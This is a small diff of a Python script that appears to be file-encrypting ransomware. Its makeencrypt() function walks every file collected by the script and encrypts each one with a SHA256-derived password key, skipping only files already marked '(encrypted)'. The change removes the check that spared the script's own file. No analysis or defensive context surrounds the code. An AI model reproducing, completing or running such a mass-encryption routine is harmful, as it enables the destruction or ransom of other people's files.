@@ -70,9 +70,6 @@ encFiles = allfiles()
 def makeencrypt():
 	for Tfiles in encFiles:	
 		if os.path.basename(Tfiles).startswith("(encrypted)"):
-			pass
-
-		elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
 			pass 
 		else:
 			encrypt(SHA256.new(password).digest(), str(Tfiles))
